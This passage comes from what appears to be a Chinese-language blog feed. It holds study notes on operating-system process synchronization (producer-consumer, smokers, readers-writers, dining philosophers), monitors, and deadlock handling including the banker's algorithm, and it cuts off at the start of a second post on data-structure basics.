aria-hidden="true">无mutex</figcaption></figure><p>结论：即使不设置专门的互斥变量mutex，也不会出现多个进程同时访问盘子的现象</p><p><strong>为什么有mutex和没有mutex一样呢？</strong></p><ul><li>原因在于：本题中的缓冲区大小为1，在任何时刻，apple、 orange、 plate三个同步信号量中最多只有一个是1。因此在任何时刻，最多只有一个进程的P操作不会被阻塞，并顺利地进入临界区</li></ul><p><strong>如果有两个盘子plate</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151153035.png"alt="如果有两个盘子plate" /><figcaption aria-hidden="true">如果有两个盘子plate</figcaption></figure><h4 id="一些总结">(4) 一些总结</h4><p>总结：在生产者-消费者问题中，如果缓冲区大小为1，那么有可能不需要设置互斥信号量就可以实现互斥访问缓冲区的功能。当然，这不是绝对的，要具体问题具体分析。</p><p>建议：在考试中如果来不及仔细分析，可以加上互斥信号量，保证各进程一定会互斥地访问缓冲区。但需要注意的是，实现互斥的P操作一定要在实现同步的P操作之后，否则可能引起“死锁”。</p><blockquote><p>加上互斥信号量就完事了</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151155820.png"alt="总结" /><figcaption aria-hidden="true">总结</figcaption></figure><h3 id="吸烟者问题">3. 吸烟者问题</h3><h4 id="问题描述-2">(1) 问题描述</h4><blockquote><p>可生产多种产品的单生产者——多消费者问题</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151157921.png"alt="吸烟者问题" /><figcaption aria-hidden="true">吸烟者问题</figcaption></figure><h4 id="问题分析-2">(2) 问题分析</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151310903.png"alt="吸烟者问题" /><figcaption aria-hidden="true">吸烟者问题</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151311504.png"alt="吸烟者问题" /><figcaption aria-hidden="true">吸烟者问题</figcaption></figure><h4 id="代码实现-2">(3) 代码实现</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151315256.png"alt="吸烟者问题" /><figcaption aria-hidden="true">吸烟者问题</figcaption></figure><h4 id="一些总结-1">(4) 一些总结</h4><p>吸烟者问题可以为我们解决“可以生产多个产品的单生产者”问题提供一个思路。</p><p>值得吸取的精华是：“轮流让各个吸烟者吸烟”，必然需要：“轮流的在桌上放上组合一、二、三”，注意体会我们是如何用一个整型变量i 实现这个“轮流”过程的。</p><p>如果题目改为“每次随机地让一个吸烟者吸烟”，我们有应该如何用代码写出这个逻辑呢？<code>random()</code></p><p>若一个生产者要生产多种产品(或者说会引发多种前驱事件)，那么各个V操作应该放在各自对应的“事件”发生之后的位置。</p><h3 id="读者写者问题">4. 读者写者问题</h3><h4 id="问题描述-3">(1) 问题描述</h4><blockquote><p>读进程之间不互斥，写进程和读进程、写进程都互斥</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151319006.png"alt="读者写者问题" /><figcaption aria-hidden="true">读者写者问题</figcaption></figure><h4 id="问题分析-3">(2) 问题分析</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151320681.png"alt="读者写者问题" /><figcaption aria-hidden="true">读者写者问题</figcaption></figure><h4 id="代码实现-3">(3) 代码实现</h4><p><strong>① 给count加mutex互斥访问</strong></p><ul><li>为什么要加mutex——保证对count变量的互斥访问</li><li>潜在的问题：读进程正在读这个文件，count的值是1，如果有一个写进程到达，由于第一个读进程已经对rw进行了P操作，rw的值变成了0，写进程在进行<code>P(rw)</code>，会被阻塞在这个信号量上面，如果这时再有读进程到达，因为count的值是1，读进程可以跳过P操作，执行下面的代码，如果有源源不断的读进程到达的话，都能直接执行，由于最后一个读进程读完之后才会<strong>解锁</strong>，会导致写进程饿死的现象</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151325300.png"alt="读者写者问题" /><figcaption aria-hidden="true">读者写者问题</figcaption></figure><p><strong>② 加一个w实现“读写公平法”</strong></p><p>若希望写进程优先，即当有读进程正在读共享文件时，有写进程请求访问，这时应禁止后续读进程的请求，等到已在共享文件的读进程执行完毕，立即让写进程执行，只有在无写进程执行的情况下才允许读进程再次运行。为此，增加一个信号量并在上面程序的writer()和reader()函数中各增加一对PV操作，就可以得到写进程优先的解决程序。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151335105.png"alt="读者写者问题" /><figcaption aria-hidden="true">读者写者问题</figcaption></figure><blockquote><p>上面的几种情况可以自己分析一下</p></blockquote><h4 id="一些总结-2">(4) 一些总结</h4><p>读者-写者问题为我们解决复杂的互斥问题提供了一个参考思路。</p><p>其核心思想在于设置了一个计数器 count用来记录当前正在访问共享文件的读进程数。我们可以用count的值来判断当前进入的进程是否是第一个/最后一个读进程，从而做出不同的处理。</p><p>另外，对 count变量的检查和赋值不能一气呵成导致了一些错误，如果需要实现“一气呵成”，自然应该想到用互斥信号量。</p><p>最后，还要认真体会我们是如何解决“写进程饥饿”问题的。</p><p>绝大多数的考研PV操作大题都可以用之前介绍的几种生产者-消费者问题的思想来解决，如果遇到更复杂的问题，可以想想能否用读者写者问题的这几个思想来解决。</p><h3 id="哲学家进餐问题">5. 哲学家进餐问题</h3><h4 id="问题描述-4">(1) 问题描述</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151338885.png"alt="哲学家进餐问题" /><figcaption aria-hidden="true">哲学家进餐问题</figcaption></figure><h4 id="问题分析-4">(2) 问题分析</h4><p>每个哲学家吃饭前依次拿起左、右两支筷子：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151339523.png"alt="哲学家进餐问题" /><figcaption aria-hidden="true">哲学家进餐问题</figcaption></figure><h4 id="代码实现-4">(3) 代码实现</h4><p>如何防止死锁的发生呢?</p><p>①可以对哲学家进程施加一些限制条件，比如最多允许四个哲学家同时进餐。这样可以保证至少有一个哲学家是可以拿到左右两只筷子的</p><p>②要求奇数号哲学家先拿左边的筷子，然后再拿右边的筷子，而偶数号哲学家刚好相反。用这种方法可以保证如果相邻的两个奇偶号哲学家都想吃饭，那么只会有其中一个可以拿起第一只筷子，另一个会直接阻塞。这就避免了占有一支后再等待另一只的情况</p><blockquote><p>思考代码如何实现这两种方案</p></blockquote><p>③ 仅当一个哲学家左右两支筷子都可用时才允许他抓起筷子。</p><p>假设0先想吃饭，1再想吃，2再想吃：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151343096.png"alt="哲学家进餐问题" /><figcaption aria-hidden="true">哲学家进餐问题</figcaption></figure><p>假设0先想吃，4再想吃：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151345367.png"alt="哲学家进餐问题" /><figcaption aria-hidden="true">哲学家进餐问题</figcaption></figure><h4 id="一些总结-3">(4) 一些总结</h4><p>哲学家进餐问题的关键在于解决进程死锁。</p><p>这些进程之间只存在互斥关系，但是与之前接触到的互斥关系不同的是，每个进程都需要<strong>同时持有两个临界资源</strong>，因此就有“死锁”问题的隐患。</p><p>如果在考试中遇到了一个进程需要同时持有多个临界资源的情况，应该参考哲学家问题的思想，分析题中给出的进程之间是否会发生循环等待，是否会发生死锁。</p><p>可以参考哲学家就餐问题解决死锁的三种思路。</p><h2 id="管程">2.3.7 管程</h2><h3 id="why">why</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151444301.png"alt="why" /><figcaption aria-hidden="true">why</figcaption></figure><h3 id="管程的定义及基本特征">管程的定义及基本特征</h3><p>管程是一种特殊的软件模块，有这些部分组成：</p><ol type="1"><li><p>局部于管程的共享数据结构说明</p></li><li><p>对该数据结构进行操作的一组过程</p></li><li><p>对局部于管程的共享数据设置初始值的语句</p></li><li><p>管程有一个名字</p><blockquote><p>跨考Tips：“过程”其实就是“函数”，可以类比于面向对象的思想</p><p>管程当做类class</p><p>共享数据结构当做类里面的变量</p><p>一组过程可以看做是类里面的函数</p></blockquote></li></ol><p>管程的基本特征：</p><ol type="1"><li>局部于管程的数据只能被局部于管程的过程所访问</li><li>一个进程只有通过调用管程内的过程才能进入管程访问共享数据</li><li>每次仅允许一个进程在管程内执行某个内部过程</li></ol><h3 id="拓展">拓展</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151554816.png"alt="管程" /><figcaption aria-hidden="true">管程</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151555932.png"alt="管程" /><figcaption aria-hidden="true">管程</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151556747.png"alt="管程" /><figcaption aria-hidden="true">管程</figcaption></figure><h1 id="死锁">2.4 死锁</h1><h2 id="死锁的概述">2.4.1 死锁的概述</h2><h3 id="资源竞争问题">1. 资源竞争问题</h3><p>系统中有许多不可被抢占的资源，即临界资源；如打印机、数据文件、队列、信号量等</p><p>需要采用互斥机制访问临界资源</p><p><strong>可重用性资源和消耗性资源</strong></p><ol type="1"><li><p>可重用性资源</p><ul><li><p>只能分配给一个进程使用，不允许多个进程共享</p></li><li><p>必须按以下顺序使用</p><ul><li><p>请求资源：如果请求失败，请求进程将会被阻塞</p></li><li><p>使用资源：进程使用该资源</p></li><li><p>释放资源：当进程使用完后自己释放资源</p></li></ul></li><li><p>系统中每一类可重用性资源中的单元数目是相对固定的，进程在运行期间既不能创建也不能删除它</p></li></ul></li></ol><ol start="2" type="1"><li><p>可消耗性资源</p><p>又称临时性资源；由进程动态创建和消耗，性质如下：</p><ul><li>① 每一类可消耗性资源的单元数目在进程运行期间是可以不断变化的</li><li>②进程可以不断创造可消耗性资源的单元，将它们放入该资源类的缓冲区中，以增加该资源类的单元数目</li><li>③进程在运行过程中，可以请求若干个可消耗性资源单元，用于进程自己的消耗，不再将它们返回给该资源类中</li></ul></li></ol><p>​ 最典型可消耗性资源是进程间传递的消息！</p><p><strong>可抢占性资源和不可抢占性资源</strong></p><ol type="1"><li>可抢占性资源：某进程在获得这类资源后，该资源可以再被其它进程或系统抢占</li></ol><ol start="2" type="1"><li>不可抢占性资源：一旦系统把该类资源分配给该进程后，就不能将它强行收回，只能在进程用完后自行释放</li></ol><h3 id="计算机系统中的死锁">2. 计算机系统中的死锁</h3><p>① 竞争不可抢占性资源引起死锁</p><p>系统中不可抢占性资源数量不足以满足多个进程运行需要，使得进程在运行过程中，会因争夺资源而陷入僵局；如下图所示：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151608885.png"alt="共享文件时的死锁情况" /><figcaption aria-hidden="true">共享文件时的死锁情况</figcaption></figure><p>② 竞争可消耗资源引起死锁</p><p>图3-13示例为三个进程在利用消息通信机制进行通信时(竞争可消耗资源，即消息m)所形成的死锁情况。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151608470.png"alt="进程之间通信时的死锁" /><figcaption aria-hidden="true">进程之间通信时的死锁</figcaption></figure><p>③ 进程推进顺序不当引起死锁</p><p>除了多个进程对资源的竞争会引发死锁外，进程在运行过程中对资源进行申请和释放的顺序是否合法，也是系统中是否会产生死锁的一个重要因素</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151609292.png"alt="进程推进顺序对死锁的影响" /><figcaption aria-hidden="true">进程推进顺序对死锁的影响</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151612111.png"alt="进程推进顺序合法" /><figcaption aria-hidden="true">进程推进顺序合法</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151612279.png"alt="进程推进顺序非法" /><figcaption aria-hidden="true">进程推进顺序非法</figcaption></figure><p>上面其实就是说了一个问题：什么时候会发生死锁？</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151617534.png"alt="什么时候会发生死锁？" /><figcaption aria-hidden="true">什么时候会发生死锁？</figcaption></figure><h3 id="死锁的定义">3. 死锁的定义</h3><blockquote><p>婆婆特里面的：在一组进程发生死锁的情况下，这组死锁进程中的每一个进程，都在等待另一个死锁进程所占有的资源。</p></blockquote><p>在并发环境下，各进程因竞争资源而造成的一种互相等待对方手里的资源，导致各进程都阻塞，都无法向前推进的现象，就是“死锁”，发生死锁后若无外力干涉这些进程都将无法向前推进</p><h3 id="死锁饥饿死循环">4. 死锁、饥饿、死循环</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151616034.png"alt="死锁、饥饿、死循环" /><figcaption aria-hidden="true">死锁、饥饿、死循环</figcaption></figure><h3 id="产生死锁的必要条件">5. 产生死锁的必要条件</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151617833.png"alt="产生死锁的必要条件" /><figcaption aria-hidden="true">产生死锁的必要条件</figcaption></figure><p>​</p><h3 id="处理死锁的方法">6. 处理死锁的方法</h3><ol type="1"><li>预防死锁。破坏死锁产生的四个必要条件中的一个或几个</li><li>避免死锁。用某种方法防止系统进入不安全状态，从而避免死锁(银行家算法)</li><li>死锁的检测和解除。允许死锁的发生，不过操作系统会负责检测出死锁的发生，然后采取某种措施解除死锁</li></ol><h2 id="预防死锁">2.4.2 预防死锁</h2><ul><li>预防死锁的方法是通过破坏产生死锁的四个必要条件中的一个或几个，以避免发生死锁</li><li>互斥条件是非共享设备所必须的特性；不仅不能改变，还应加以保证</li><li>因此，死锁预防主要是破坏产生死锁的后三个条件</li></ul><h3 id="破坏互斥条件">1.破坏互斥条件</h3><blockquote><p>不建议这样做</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151621206.png"alt="破坏互斥条件" /><figcaption aria-hidden="true">破坏互斥条件</figcaption></figure><h3 id="破坏不可剥夺条件">2. 破坏不可剥夺条件</h3><blockquote><p>不可剥夺条件又称 不可抢占条件</p></blockquote><p>不剥夺条件：进程所获得的资源在未使用完之前，不能由其他进程强行夺走，只能主动释放。</p><p>破坏不剥夺条件：</p><p>方案一：当某个进程请求新的资源得不到满足时，它必须立即释放保持的所有资源，待以后需要时再重新申请。也就是说，即使某些资源尚未使用完，也需要主动释放，从而破坏了不可剥夺条件。</p><p>方案二：当某个进程需要的资源被其他进程所占有的时候，可以由操作系统协助，将想要的资源强行剥夺。这种方式一般需要考虑各进程的优先级(比如：剥夺调度方式，就是将处理机资源强行剥夺给优先级更高的进程使用)</p><p>该策略的缺点：</p><ol type="1"><li>实现起来比较复杂。</li><li>释放已获得的资源可能造成前一阶段工作的失效。因此这种方法一般只适用于易保存和恢复状态的资源，如CPU。</li><li>反复地申请和释放资源会增加系统开销，降低系统吞吐量。</li><li>若采用方案一，意味着只要暂时得不到某个资源，之前获得的那些资源就都需要放弃，以后再重新申请。如果一直发生这样的情况，就会导致进程饥饿。</li></ol><h3 id="破坏请求和保持条件">3. 破坏请求和保持条件</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151628930.png"alt="破坏请求和保持条件" /><figcaption aria-hidden="true">破坏请求和保持条件</figcaption></figure><h3 id="破坏循环等待条件">4. 破坏循环等待条件</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151637987.png"alt="破坏循环等待条件" /><figcaption aria-hidden="true">破坏循环等待条件</figcaption></figure><h2 id="避免死锁">2.4.3 避免死锁</h2><ul><li>属于事先预防的策略，但并不是事先采取某种限制措施去破坏产生死锁的必要条件</li><li>是在资源动态分配过程中，防止系统进入不安全状态，以避免发生死锁</li><li>这种方法所施加的限制条件较弱，可能获得较好的系统性能；目前常用此方法来避免发生死锁</li></ul><h3 id="系统安全状态">1. 系统安全状态</h3><ul><li>把系统的状态分为安全状态和不安全状态</li><li>当系统处于安全状态时，可避免发生死锁；当系统处于不安全状态时，则可能进入到死锁状态</li></ul><p>① 安全状态</p><ul><li>定义：系统能按某种进程推进顺序为每个进程分配所需资源，使进程都能顺利完成。若存在该顺序，则系统处于<strong>安全状态</strong>;否则，处于<strong>不安全状态</strong></li><li>允许进程动态地申请资源，但系统在进行资源分配之前应先计算此次资源分配的安全性</li></ul><p>② 安全状态示例</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151646699.png"alt="安全状态示例" /><figcaption aria-hidden="true">安全状态示例</figcaption></figure><p>P2---P1----P3</p><blockquote><p>总结：</p><p>所谓安全序列，就是指如果系统按照这种序列分配资源，则每个进程都能顺利完成。只要能找出一个安全序列，系统就是安全状态。当然，安全序列可能有多个。</p><p>如果分配了资源之后，系统中找不出任何一个安全序列，系统就进入了不安全状态。这就意味着之后可能所有进程都无法顺利的执行下去。当然，如果有进程提前归还了一些资源，那系统也有可能重新回到安全状态，不过我们在分配资源之前总是要考虑到最坏的情况。</p><p>如果系统处于安全状态，就一定不会发生死锁。如果系统进入不安全状态，就可能发生死锁(处于不安全状态未必就是发生了死锁，但发生死锁时一定是在不安全状态)</p><p>因此可以在资源分配之前预先判断这次分配是否会导致系统进入不安全状态，以此决定是否答应资源分配请求。这也是“银行家算法”的核心思想。</p></blockquote><h3 id="银行家算法">2. 银行家算法</h3><blockquote><p>Dijkstra在1965年提出的银行家算法是著名的死锁避免算法，这个用于一个银行家给多个顾客贷款的算法可以直接用于操作系统给进程分配资源，这时只要把银行家换成操作系统，把顾客换成进程，把资金换成资源，把银行家决定是否放贷时所用的判断过程（即判断顾客是否有信誉和偿还能力）换成操作系统决定是否分配资源时所用的判断过程（即判断进程是否能及时归还资源）即可。</p></blockquote><p>银行家算法的实质就是<strong>要设法保证系统动态分配资源后不进入不安全状态，以避免可能产生的死锁。</strong></p><h4 id="例子">例子</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151654236.png"alt="银行家算法" /><figcaption aria-hidden="true">银行家算法</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151654833.png"alt="银行家算法" /><figcaption aria-hidden="true">银行家算法</figcaption></figure><h4 id="银行家算法中的数据结构">银行家算法中的数据结构</h4><p>为了实现银行家算法，在系统中必须设置这样四个数据结构：</p><p>1）<strong>Available向量</strong>：系统中可利用的资源数目，长度为m的一维数组</p><p>2）<strong>Max矩阵</strong>：每个进程对每种资源的最大需求，n*m的矩阵</p><p>3）<strong>Allocation矩阵</strong>：每个进程已分配的各类资源的数目，n*m的矩阵</p><p>4）<strong>Need矩阵</strong>：每个进程还需要的各类资源数，<code>Need[i,j] = Max[i,j] - allocation[i, j]</code></p><p>5）<strong>Request</strong>：表示进程此次申请的各种资源数，长度为m的一维数组</p><h4 id="银行家算法的描述">银行家算法的描述</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151659146.png"alt="初试数据" /><figcaption aria-hidden="true">初试数据</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151657873.png"alt="银行家算法" /><figcaption aria-hidden="true">银行家算法</figcaption></figure><h4 id="section"></h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311071628354.png"alt="image-20231107162817252" /><figcaption aria-hidden="true">image-20231107162817252</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311071628465.png"alt="image-20231107162835370" /><figcaption aria-hidden="true">image-20231107162835370</figcaption></figure><h4 id="银行家算法流程图表示">银行家算法流程图表示</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311071626146.png"alt="image-20231107162637053" /><figcaption aria-hidden="true">image-20231107162637053</figcaption></figure><h4 id="银行家算法的程序实现">银行家算法的程序实现</h4><p><strong>数据结构：</strong></p><ol type="1"><li>可用资源向量<code>Available</code>,这是一个一维数组<code>Available[j],j=1,…m</code>，表示第<code>j</code>种资源的可用数量，其中<code>m</code>为资源的种类个数</li><li>最大资源需求矩阵<code>Max</code>,这是一个<code>n*m</code>的二维数组，其中<code>n</code>为进程个数。单元<code>Max[i,j]</code>存储的数值表示第<code>i</code>个进程最多需要多少第<code>j</code>种资源</li><li>分配矩阵<code>Allocation</code>，这是一个<code>n*m</code>的二维数组。单元<code>Allocation[i,j]</code>存储的是已经分配给第<code>i</code>个进程的第<code>j</code>种资源的数量</li><li>需求矩阵<code>Need</code>，这也是一个<code>n*m</code>的矩阵，单元<code>Need[i,j]</code>存储的数值表示进程<code>i</code>还需要多少第<code>j</code>种资源的数量才能完成退出。</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>詹姆斯？<br></code></pre></td></tr></table></figure><p>可以看一下b站这个视频，做题是话应该够了：</p><p><ahref="https://www.bilibili.com/video/BV1rJ411p7au/?spm_id_from=333.337.search-card.all.click&amp;vd_source=39f0a6c7a4d98748bb31fcf1e1a3ab7f">操作系统-银行家算法_哔哩哔哩_bilibili</a></p><h2 id="死锁的检测和解除">2.4.4 死锁的检测和解除</h2><p>如果在系统中，既不采取死锁预防措施也未配有死锁避免算法，系统很可能会发生死锁；在这种情况下，系统应当提供两个算法：</p><p>① 死锁检测算法：用于检测系统状态，以确定系统中是否发生了死锁</p><p>②死锁解除算法：当认定系统中已发生了死锁，利用该算法可将系统从死锁状态中解脱出来</p><h3 id="死锁的检测">1. 死锁的检测</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312152135794.png"alt="死锁的检测" /><figcaption aria-hidden="true">死锁的检测</figcaption></figure><p>如果系统中剩余的可用资源数足够满足进程的需求，那么这个进程暂时是不会阻塞的，可以顺利地执行下去。</p><p>如果这个进程执行结束了把资源归还系统，就可能使某些正在等待资源的进程被激活，并顺利地执行下去。相应的，这些被激活的进程执行完了之后又会归还一些资源，这样可能又会激活另外一些阻塞的进程...</p><p>如果按上述过程分析，最终能消除所有边，就称这个图是可完全简化的。此时一定没有发生死锁(相当于能找到一个安全序列)</p><p>如果最终不能消除所有边，那么此时就是发生了死锁，最终还连着边的那些进程就是处于死锁状态的进程</p><ul><li>举个例子，可以消除所有边，即无死锁发生</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312152140347.png"alt="死锁的检测" /><figcaption aria-hidden="true">死锁的检测</figcaption></figure><ul><li>举个例子，不可消除所有边，即产生死锁</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312152141978.png"alt="死锁的检测" /><figcaption aria-hidden="true">死锁的检测</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312152142522.png"alt="死锁的检测" /><figcaption aria-hidden="true">死锁的检测</figcaption></figure><h3 id="死锁的解除">2. 死锁的解除</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312152143990.png"alt="死锁的解除" /><figcaption aria-hidden="true">死锁的解除</figcaption></figure><blockquote><p>参考：</p><p><ahref="https://blog.csdn.net/weixin_43914604/article/details/104415990">《王道操作系统》学习笔记总目录+思维导图_王道操作系统思维导图-CSDN博客</a></p><p><ahref="https://www.zhihu.com/tardis/zm/art/384678500?source_id=1005">详解操作系统之银行家算法（附流程图）(zhihu.com)</a></p><p><ahref="https://www.bilibili.com/video/BV1YE411D7nH?p=13&amp;vd_source=39f0a6c7a4d98748bb31fcf1e1a3ab7f">2.1_2_进程的状态与转换、进程的组织_哔哩哔哩_bilibili</a></p><p><a href="https://zhuanlan.zhihu.com/p/585216267">【OS 操作系统】047 |进程同步与互斥 - 知乎 (zhihu.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构 1 绪论</title>
    <link href="/2023/11/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%201_%E7%BB%AA%E8%AE%BA/"/>
    <url>/2023/11/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%201_%E7%BB%AA%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<p>凭借一句话获得图灵奖的Pascal语言之父——NicklausWirth，让他获得图灵奖的这句话就是他提出的著名公式： <spanclass="math display">\[程序 = 数据结构 + 算法\]</span></p><h2 id="基本概念和术语">基本概念和术语</h2><p>知识结构图： 数据 ——&gt; 数据元素 ——&gt; 数据项 ——&gt; 数据对象</p><p>数据：是对客观事物的符号表示</p><p>数据元素(dataelement)：是数据的基本单位，在计算机程序中通常作为一个整体进行考虑和处理。一个数据元素往往由若干数据项组成。</p><p>数据项(DataItem)：是组成数据元素的、有独立含义的、不可分割的最小单位</p><p>数据对象(data object)：是性质相同的数据元素的集合</p><p>数据结构(DataStructure)：是相互之间存在一种或多种特定关系的数据元素的集合。换句话说，数据结构是带”结构＂的数据元素的集合，“结构”就是指数据元素之间存在的关系。</p><p><strong>逻辑结构和物理结构</strong></p><p>逻辑结构：数据的逻辑结构是从逻辑关系上描述数据，它与数据的存储无关，是独立于计算机的。因此，数据的逻辑结构可以看作是从具体问题抽象出来的数学模型。数据的逻辑结构有两个要素：一是数据元素；二是关系。</p><p>四类基本逻辑结构</p><ul><li>集合</li><li>松散结构线性结构：一对一的关系</li><li>树形结构：一对多关系</li><li>图状结构：多对多关系</li></ul><p>物理结构/存储结构</p><p>物理结构：数据的逻辑结构在计算机中(内存)的存储形式。</p><p>分为顺序存储结构、链式存储结构、索引存储结构、散列存储结构。</p><p><strong>数据类型</strong></p><p>数据类型是一个值的集合和定义在值集上的一组操作的总称。</p><p>在使用高级程序设计语言编写程序时，必须对程序中出现的每个变量、常量或表达式、C语言中函数的参数、返回值，明确说明它们所属的数据类型。</p><p>C语言中：提供int,char,float,double等基本数据类型；数组、结构、共用体、枚举等构造数据类型；还有指针、空（void)类型，用户也可用typedef自己定义数据类型。而另一些常用的数据结构，如栈、队列、树、图等，不能直接用数据类型来表示。</p><p>在C语言中，数据类型可以分为两类：</p><ul><li>原子类型：是不可以再分解的基本类型，包括整型、实型、字符型等</li><li>结构类型：由若干个类型组合而成，是可以再分解的。例如，整型姿型数据组成的数组。</li></ul><h2 id="抽象数据类型adt">抽象数据类型(ADT)</h2><p>是指一个数据模型以及定义在该模型上的一组操作。和数据类型实质上是一个概念</p><p>形式化定义: (D, S, P)</p><ul><li>D是数据对象</li><li>S是D上的关系集</li><li>P是对D的基本操作</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">定义格式<br>      ADT 抽象数据类型名 &#123;<br>             数据对象: <span class="hljs-tag">&lt;<span class="hljs-name">数据对象的定义</span>&gt;</span><br>             数据关系: <span class="hljs-tag">&lt;<span class="hljs-name">数据关系的定义</span>&gt;</span><br>             基本操作: <span class="hljs-tag">&lt;<span class="hljs-name">基本操作的定义</span>&gt;</span><br>      &#125; ADT 抽象数据类型  <br><br></code></pre></td></tr></table></figure><p>对图形进行一个缩放n倍<code>scale(G(被操作的图形),n)</code>对图形进行缩放，它当然也会返回一个图形<code>G'=scale(G,n)</code>返回值要赋值给G写成<code>scale（&amp;G,n）</code>引用参数以"&amp;"打头，除可提供输入值外，还将返回操作结果。</p><h2 id="算法和算法分析">算法和算法分析</h2><h3 id="算法">算法</h3><p>算法定义：解决问题的方法和步骤。在计算机中表现为指令的有限序列。其中每条指令表示一个或多个操作。</p><p>算法的描述</p><p>自然语言；流程图【NS图、框图】；伪代码(<strong>类C语言</strong>)；程序设计(C、Java...)</p><p><strong>程序与算法</strong></p><ul><li>程序=数据结构+算法</li><li>数据结构通过算法来实现操作</li><li>算法根据数据结构设计程序</li></ul><p><strong>算法的特性(确定、有穷、可行、输入、输出)</strong></p><ol type="1"><li>有穷性：算法在执行有限步骤之后，自动结束而不会出现无限循环，并且每一个步骤都在可接受的时间范围内完成。当然这里的有穷并不是纯数学意义的，而是在实际应用中合理的、可以接受的“边界”。</li><li>确定性：算法的每一个步骤都有确定的含义，不会出现二义性(不会有歧义)。</li><li>可行性：算法中的所有操作都可以通过已经实现的基本操作运算执行有限次来实现。</li><li>输入：一个算法有零个或多个输入。当用函数描述算法时，输入往往是通过形参表示的，在它们被调用时，从主调函数获得输入值。</li><li>输出：一个算法有一个或多个输出，它们是算法进行信息加工后得到的结果，无输出的算法没有任何意义。当用函数描述算法时，输出多用返回值或引用类型的形参表示。</li></ol><p><strong>算法的设计要求</strong></p><p>好的算法应该具有正确性、可读性、健壮性、时间效率高和存储量低的特征。</p><ol 